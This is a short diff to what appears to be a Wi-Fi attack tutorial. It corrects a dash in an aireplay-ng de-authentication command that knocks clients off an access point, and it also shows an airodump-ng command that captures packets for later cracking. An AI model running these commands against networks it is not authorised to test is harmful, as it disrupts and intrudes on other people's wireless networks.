@@ -8,7 +8,7 @@ Monitoring
 
 Speeding up
     We can launch a de-authentication attack to speed up the process:
-    **$ aireplay-ng -0 3 –a <macaddress of the ap> mon0**
+    **$ aireplay-ng -0 3 -a <macaddress of the ap> mon0**
 
 Capturing packages
     **$ airodump-ng mon0 --bssid –c (channel) –w (file name to save)**
